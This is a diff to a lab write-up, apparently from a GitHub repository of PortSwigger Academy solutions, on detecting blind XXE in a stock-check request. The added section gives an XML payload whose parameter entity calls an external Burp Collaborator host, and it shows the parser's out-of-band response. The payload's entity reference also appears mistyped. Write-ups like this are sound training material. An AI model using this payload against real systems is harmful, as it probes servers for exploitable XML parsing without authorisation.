@@ -32,7 +32,7 @@ Clicking on checkstock feature , browser sends the following request.
 ```xml
 POST /product/stock HTTP/1.1
 Host: 0a0f001d038e90d781560cbc008a008e.web-security-academy.net
-Cookie: session=gkq4gIYhDLxhrPndgufyUGUiDzIeF4Wz
+Cookie: session=tWHXpacEnJFUs1Ubp8MfIn8s0crmL4Uc
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
 Accept: */*
 Accept-Language: en-US,en;q=0.5
@@ -53,4 +53,44 @@ Connection: close
   <storeId>1</storeId>
 </stockCheck>
 ```
+
+First we will declare a DOCTYPE eith parameterized entitites (**%**) which contains the url of our collaborator server -`<!DOCTYPE root [<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x">]>`
+
+Then in the `<productID>` , we can reference the parameterized entitiy using - `%ext;`
+
+
+**Payload -**
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY % ext SYSTEM "http://jre5j77p3ggwt0aat4r2larlwc22qr.oastify.com/x">]>
+ <stockCheck>
+ <productId>% ext;</productId>
+ <storeId>1</storeId>
+</stockCheck>
+```
+
+
+The response says - `Invalid product ID` which means the product id  is invalid but it is a indication that the xml parser parsed the xml query & made outbound request to our collaborator-server.
+
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/89bb94c8-ebee-466d-b967-94c6c98ffbcd)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
